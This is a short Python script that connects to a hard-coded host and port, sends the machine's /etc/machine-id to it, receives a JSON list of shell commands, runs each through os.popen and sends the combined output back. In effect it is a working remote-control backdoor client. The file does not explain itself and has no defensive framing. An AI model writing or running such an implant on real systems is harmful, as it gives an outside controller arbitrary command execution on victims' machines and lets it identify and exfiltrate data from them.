import socket
import os
import json

infoSend={}
ipAddr = '192.168.2.60'
port = 1234
data = ""
cmdOut = {}
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ipAddr, port))
f = open("/etc/machine-id", "r")
cmdId = (f.read()).strip()
s.send(cmdId.encode())
### machine id is sent, now we listen for instructions
srvMsg = s.recv(1024).decode()
taskList = json.loads(srvMsg)
for task in taskList:
    if task == 'Quit':
        break
    cmdOut[task] = (os.popen(task).read())
    
data = json.dumps(cmdOut)
s.send(data.encode())

